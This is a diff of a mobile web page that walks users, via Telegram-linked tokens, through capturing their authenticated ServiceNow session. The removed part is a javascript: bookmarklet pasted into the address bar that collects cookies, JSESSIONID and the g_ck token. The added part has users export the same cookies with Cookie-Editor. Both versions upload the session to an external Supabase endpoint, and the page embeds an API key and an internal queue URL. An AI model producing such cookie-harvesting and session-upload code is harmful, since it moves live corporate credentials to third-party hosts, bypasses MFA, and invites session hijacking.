@@ -8,87 +8,95 @@
     *{box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#0f172a;color:#e2e8f0;line-height:1.5}
     h1{font-size:1.35rem;margin:0 0 8px}
+    h2{font-size:.95rem;color:#38bdf8;margin:14px 0 8px}
     .card{background:#1e293b;border-radius:12px;padding:16px;margin:16px 0}
     .step{font-weight:600;color:#38bdf8;margin-bottom:6px}
     a.btn,button.primary{display:block;width:100%;text-align:center;background:#2563eb;color:#fff;text-decoration:none;padding:14px;border-radius:10px;font-weight:600;margin:12px 0;border:none;font-size:1rem}
     button.green{background:#059669}
+    button.purple{background:#7c3aed}
+    input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;margin:6px 0;font-size:14px}
     .ok{color:#4ade80}.err{color:#f87171}
     small{color:#94a3b8}
     ol{padding-left:1.2rem;margin:8px 0}
-    li{margin:10px 0}
+    li{margin:8px 0}
     .tip{background:#0f172a;border-left:3px solid #4ade80;padding:10px 12px;margin:10px 0;border-radius:6px}
-    .num{display:inline-block;width:1.4rem;height:1.4rem;line-height:1.4rem;text-align:center;background:#2563eb;border-radius:50%;font-size:.85rem;margin-right:6px}
   </style>
 </head>
 <body>
   <h1>🔄 Refresh session (Android)</h1>
   <p id="err" class="err"></p>
   <div id="app" style="display:none">
-    <div class="tip"><strong>Chrome on Android only.</strong> Open this page in Chrome (not Telegram in-app browser).</div>
-
-    <div class="card">
-      <div class="step"><span class="num">1</span> Copy script</div>
-      <button type="button" class="primary green" id="copyScript">📋 Copy session script</button>
-      <p id="copyMsg"></p>
+    <div class="tip">
+      <strong>Scripts don't work</strong> on phone browsers. Use <strong>Kiwi Browser + Cookie-Editor</strong> instead (free, Play Store).
     </div>
 
     <div class="card">
-      <div class="step"><span class="num">2</span> Login to queue</div>
-      <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
-      <p><small>MFA login → wait until <strong>ticket rows</strong> show.</small></p>
-    </div>
-
-    <div class="card">
-      <div class="step"><span class="num">3</span> Run on ServiceNow tab</div>
+      <div class="step">Step 1 — Install (one time)</div>
       <ol>
-        <li>Switch to the <strong>micron.service-now.com</strong> tab</li>
-        <li>Tap <strong>address bar</strong> at top</li>
-        <li><strong>Select all</strong> → delete URL completely</li>
-        <li><strong>Paste</strong> the script → tap <strong>Go</strong></li>
-        <li>Popup: <strong>✅ Done! Check Telegram</strong></li>
+        <li>Play Store → install <strong>Kiwi Browser</strong></li>
+        <li>Kiwi → menu → <strong>Extensions</strong> → open Chrome Web Store</li>
+        <li>Search <strong>Cookie-Editor</strong> → Add to Kiwi</li>
       </ol>
-      <p><small>Address bar must show only <code>javascript:...</code> — not a Google search.</small></p>
+    </div>
+
+    <div class="card">
+      <div class="step">Step 2 — Login in Kiwi</div>
+      <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
+      <p><small>Open in <strong>Kiwi</strong> (not Chrome). MFA login → see tickets.</small></p>
+    </div>
+
+    <div class="card">
+      <div class="step">Step 3 — Export cookies</div>
+      <ol>
+        <li>On ServiceNow page → tap Kiwi <strong>⋮</strong> menu → <strong>Extensions</strong> → <strong>Cookie-Editor</strong></li>
+        <li>Tap <strong>Export</strong> → <strong>Header string</strong> (or copy all)</li>
+        <li>Must include <strong>JSESSIONID=</strong></li>
+      </ol>
+    </div>
+
+    <div class="card">
+      <div class="step">Step 4 — Paste here & upload</div>
+      <p><small>Open this page in Kiwi too (from Telegram link).</small></p>
+      <textarea id="cookie" rows="4" placeholder="JSESSIONID=...; glide_session_store=...; UX-Token=..."></textarea>
+      <input id="gck" placeholder="g_ck (optional — copy from page source if needed)"/>
+      <button type="button" class="primary purple" id="submit">Upload session</button>
+      <p id="msg"></p>
     </div>
   </div>
   <script>
     const SUPABASE_URL = 'https://qhkeirrhjjtdyvrdkbxn.supabase.co';
     const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoa2VpcnJoamp0ZHl2cmRrYnhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY4MjY0MjEsImV4cCI6MjA5MjQwMjQyMX0.vgHg7uMrhaZ2YwKhmBKxrgmHzm83Ze3gD3XapXpGACc';
     const SNOW_QUEUE_URL = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744%26sysparm_first_row%3D1%26sysparm_view%3D';
-    const SNOW_QUERY = 'active=true^assignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744';
     const token = new URLSearchParams(location.search).get('t');
     const errEl = document.getElementById('err');
     const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
 
-    function sessionScript(tok) {
-      if (!tok) throw new Error('Open the latest Telegram link');
-      const inline = `(async function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var q=${JSON.stringify(SNOW_QUERY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';if(!g)throw new Error('Open queue and login first');var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});if(!te.ok)throw new Error('Login first — API '+te.status);var parts={};document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();for(var j=0;j<all.length;j++){var c=all[j];if(c.name)parts[c.name]=c.value}}}catch(e){}var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');if(!/JSESSIONID=/.test(cookie))throw new Error('Missing JSESSIONID — stay on ServiceNow tab');var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});var d=await r.json();if(!d.ok)throw new Error(d.error||'Upload failed');alert('✅ Done! Check Telegram.')})().catch(function(e){alert('❌ '+e.message)});`;
-      return 'javascript:' + encodeURIComponent(inline);
-    }
-
     if (!token) {
-      errEl.textContent = '❌ Missing token — tap the newest Telegram alert link.';
+      errEl.textContent = '❌ Open the latest Telegram link (includes token).';
     } else {
       errEl.style.display = 'none';
       document.getElementById('app').style.display = 'block';
       document.getElementById('snow').href = SNOW_QUEUE_URL;
-      document.getElementById('copyScript').onclick = async () => {
-        const cm = document.getElementById('copyMsg');
+      document.getElementById('submit').onclick = async () => {
+        const msg = document.getElementById('msg');
+        const cookie = document.getElementById('cookie').value.trim();
+        const gck = document.getElementById('gck').value.trim();
+        if (!cookie) { msg.textContent = '❌ Paste cookies from Cookie-Editor'; msg.className = 'err'; return; }
+        if (!/JSESSIONID=/.test(cookie)) { msg.textContent = '❌ Must include JSESSIONID= — use Cookie-Editor export'; msg.className = 'err'; return; }
+        if (cookie.toLowerCase().startsWith('javascript:')) { msg.textContent = '❌ Paste cookies, not the script'; msg.className = 'err'; return; }
+        msg.textContent = 'Uploading...';
         try {
-          const script = sessionScript(token);
-          if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(script);
-          else {
-            const ta = document.createElement('textarea');
-            ta.value = script;
-            document.body.appendChild(ta);
-            ta.select();
-            document.execCommand('copy');
-            document.body.removeChild(ta);
-          }
-          cm.textContent = '✅ Copied! Now step 2 → 3 on ServiceNow tab.';
-          cm.className = 'ok';
+          const r = await fetch(rpc, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY },
+            body: JSON.stringify({ p_token: token, p_cookie: cookie, p_g_ck: gck }),
+          });
+          const d = await r.json();
+          msg.textContent = d.ok ? '✅ ' + (d.message || 'Done! Check Telegram.') : '❌ ' + (d.error || 'Failed');
+          msg.className = d.ok ? 'ok' : 'err';
         } catch (e) {
-          cm.textContent = '❌ ' + e.message;
-          cm.className = 'err';
+          msg.textContent = '❌ ' + e;
+          msg.className = 'err';
         }
       };
     }
